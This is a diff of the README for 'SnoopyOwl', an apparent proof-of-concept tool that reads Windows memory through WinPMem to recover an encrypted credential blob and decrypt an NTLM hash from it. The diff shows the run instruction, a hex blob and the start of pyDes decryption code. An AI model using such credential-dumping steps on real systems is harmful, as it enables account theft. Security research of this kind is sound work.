@@ -1,4 +1,4 @@
-# SnoopyOwl
+# SnoopyOwl (Proof of Concept)
 
 # Example:
 Load WinPMem (`winpmem -l`) and execute SnoopyOwl (remember to change the hardcoded PID):
@@ -24,7 +24,7 @@ Load WinPMem (`winpmem -l`) and execute SnoopyOwl (remember to change the hardco
 f0e368d8302af9bbcd247687552e8207d766e674c99a61907e78a173d5e4d475df165ec1fcba3b5d3463f8bd7ce5fa6457d043147dcf26a6e03ec12d1216d57953a7f4cbdcaeec2c6a27787c332db706a5287a77957d09d546590d7f32a117f69d983290c01b1ad83cf66916ee76314c17605518a17d7ea9db2de530b1298e5178fcc638e1ae106542dcb46e37a09943dd10e3e2f15a99b93989361aa3a6e6ed8e98aab5578712bcf0f9e5a5372542f61a9032bf5d110278253c4f602107a02bf2cfe07fae7f81a4dee6440a596278e7c06eee06de5aa7f705bd6132dea0327ad869eca5da1538e098edfefcd050dd6e36a0a3196cdf5ee6786d0b62a3d526981f6c4fc503d43238887cf6f3c51cca01b912194242d7e5a76522aaf791c467ea6035a06219ea2aafc2860e6db56ddb77936871316e3f18fd9b1425f948c925171829e460cf7c31f9a0396705bcb1bfd0055b25de160cf816472180270f36e9224868d1377349f7bb001e7edfe52dbd1915a70fb686f850086732c57ba26423f7a3691ddb9b23b5f2166a56ee82d30571ffb79b222e707f6dc2cc5f986723d99229345b2d0b97371abb1573f59efecd6a
 ```
 
-The NTLM hash can be decrypted with the previous information:
+The NTLM hash can be decrypted from the "cryptoblob" with the previous information:
 
 ```
 >> from pyDes import *
